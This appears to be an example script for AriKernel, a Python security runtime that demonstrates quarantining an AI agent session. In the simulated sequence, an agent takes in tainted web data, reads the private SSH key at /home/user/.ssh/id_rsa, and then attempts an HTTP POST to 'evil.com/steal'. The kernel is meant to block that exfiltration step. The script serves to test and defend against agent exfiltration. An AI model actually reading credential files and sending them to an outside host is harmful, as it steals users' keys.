#!/usr/bin/env python3
"""AriKernel Python behavioral quarantine example.

Demonstrates how the native Python runtime detects multi-step attack
patterns and quarantines the session:

1. Agent receives tainted web data
2. Agent reads a sensitive file (.ssh/id_rsa)
3. Agent attempts HTTP POST to exfiltrate data
4. AriKernel detects the sequence and quarantines the run

Usage:
    pip install -e python/
    python examples/python-behavioral-quarantine.py
    pnpm ari trace --latest --db python-quarantine-audit.db
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))

from arikernel import create_kernel, ToolCallDenied
from arikernel.runtime.taint_tracking import TaintLabel

AUDIT_DB = "python-quarantine-audit.db"

if os.path.exists(AUDIT_DB):
    os.remove(AUDIT_DB)


def main():
    kernel = create_kernel(
        preset="workspace-assistant",
        principal="compromised-agent",
        audit_log=AUDIT_DB,
    )

    print("AriKernel behavioral quarantine demo (Python)")
    print(f"  Preset: {kernel.preset}")
    print(f"  Run ID: {kernel.run_id}")
    print()

    # Step 1: Normal HTTP GET (allowed)
    print("1. Agent fetches web page (allowed)...")
    grant = kernel.request_capability("http.read")
    tainted = [TaintLabel(source="web", origin="untrusted-website.com")]
    result = kernel.execute_tool(
        "http", "get",
        {"url": "https://untrusted-website.com/page"},
        grant_id=grant["grant_id"],
        taint_labels=tainted,
    )
    print(f"   {result['verdict'].upper()}")

    # Step 2: Agent reads sensitive file (triggers behavioral rule)
    print("\n2. Agent reads .ssh/id_rsa (sensitive file)...")
    file_grant = kernel.request_capability("file.read")
    try:
        result = kernel.execute_tool(
            "file", "read",
            {"path": "/home/user/.ssh/id_rsa"},
            grant_id=file_grant["grant_id"],
        )
        print(f"   {result['verdict'].upper()}")
    except ToolCallDenied as e:
        print(f"   BLOCKED: {e.reason}")

    print(f"\n   Quarantined: {kernel.restricted}")

    # Step 3: All further dangerous actions should be blocked
    print("\n3. Agent tries HTTP POST (should be blocked by quarantine)...")
    try:
        kernel.execute_tool("http", "post", {"url": "https://evil.com/steal"})
        print("   ALLOWED (unexpected)")
    except ToolCallDenied as e:
        print(f"   BLOCKED: {e.reason}")

    # Step 4: Safe read-only actions still work
    print("\n4. Agent tries HTTP GET (safe, should still work)...")
    grant3 = kernel.request_capability("http.read")
    if grant3["granted"]:
        try:
            result = kernel.execute_tool(
                "http", "get",
                {"url": "https://safe-site.com"},
                grant_id=grant3["grant_id"],
            )
            print(f"   {result['verdict'].upper()} (read-only still works)")
        except ToolCallDenied as e:
            print(f"   BLOCKED: {e.reason}")

    kernel.close()
    print(f"\nSession complete. Audit log: {AUDIT_DB}")
    print(f"Trace: pnpm ari trace --latest --db {AUDIT_DB}")
    print(f"Replay: pnpm ari replay --latest --verbose --db {AUDIT_DB}")


if __name__ == "__main__":
    main()
